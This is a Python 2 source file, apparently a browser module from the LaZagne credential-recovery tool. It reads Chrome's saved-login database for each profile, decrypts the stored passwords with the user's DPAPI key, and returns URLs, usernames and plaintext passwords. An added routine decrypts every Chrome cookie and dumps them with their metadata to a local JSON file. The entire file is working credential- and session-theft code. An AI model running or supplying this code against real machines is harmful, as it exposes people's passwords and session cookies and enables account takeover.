#!/usr/bin/env python
# -*- coding: utf-8 -*- 
from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.utils import build_path
from lazagne.config.constant import *
import traceback
import sqlite3
import os
import json

class Chrome(ModuleInfo):
	def __init__(self):
		ModuleInfo.__init__(self, name='chrome', category='browsers', dpapi_used=True)

	def run(self, software_name=None):
		path = build_path(software_name)
		if path:
			pwdFound = []
			for profile in os.listdir(path):
				
				# Cookies Decrypt Methods
				self.cookie_enum(path,profile)
				
				# Password Methods
				
				database_path = os.path.join(path, profile, u'Login Data')
				if not os.path.exists(database_path):
					print_debug('DEBUG', u'User database not found: {database_path}'.format(database_path=database_path))
					continue
				else:
					print_debug('DEBUG', u'User database found: {database_path}'.format(database_path=database_path))

				# Connect to the Database
				try:
					conn 	= sqlite3.connect(database_path)
					cursor 	= conn.cursor()
				except Exception,e:
					print_debug('ERROR', u'An error occured opening the database file')
					print_debug('DEBUG', traceback.format_exc())
					continue 
				
				# Get the results
				cursor.execute('SELECT action_url, username_value, password_value FROM logins')
				for result in cursor.fetchall():
					try:
						# Decrypt the Password
						password = constant.user_dpapi.decrypt_blob(result[2])
						if password:
							pwdFound.append(
								{
									'URL'		: result[0], 
									'Login'		: result[1], 
									'Password'	: password
								}
							)
					except Exception,e:
						print_debug('DEBUG', traceback.format_exc())
				
				conn.close()

			return pwdFound

		
		
	def cookie_enum(self,path,profile):
		
		username = os.path.basename(os.path.dirname(path))

		cookieFound = []
	
		cookie_database_path = os.path.join(path, profile, u'Cookies')
	
		if not os.path.exists(cookie_database_path):
			print_debug('DEBUG', u'Cookie database not found: {database_path}'.format(database_path=cookie_database_path))
			return
		else:
			print_debug('DEBUG', u'Cookie database found: {database_path}'.format(database_path=cookie_database_path))

	
		# Connect to the Database
		try:
			conn 	= sqlite3.connect(cookie_database_path)
			cursor 	= conn.cursor()
		except Exception,e:
			print_debug('ERROR', u'An error occured opening the cookie file')
			print_debug('DEBUG', traceback.format_exc())
			return
		

		#cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
		cursor.execute('SELECT creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, encrypted_value, firstpartyonly FROM cookies')

		for result in cursor.fetchall():
			try:
				# Decrypt the Password
				password = constant.user_dpapi.decrypt_blob(result[12])
				#print('encrypted', result[1] , result[2] , result[3], password)
				if password:
					cookieFound.append(
							{
								'creation_utc'		: result[0],
								'host_key'		: result[1],
								'name'			: result[2],
								'value'			: result[3],
								'path'			: result[4],
								'expires_utc'		: result[5],
								'is_secure'		: result[6],
								'is_httponly'		: result[7],
								'last_access_utc'	: result[8],
								'has_expires'		: result[9],
								'is_persistent'		: result[10],
								'priority'		: result[11],
								'encrypted_value'	: password,
								'firstpartyonly'	: result[13]
							}
					)
			except Exception,e:
				print_debug('DEBUG', traceback.format_exc())

		conn.close()
		
		with open('cookies-%s-%s.json' % (username, profile), 'w') as fp:
			json.dump(cookieFound, fp, indent=2)
		
		
				
		return
	
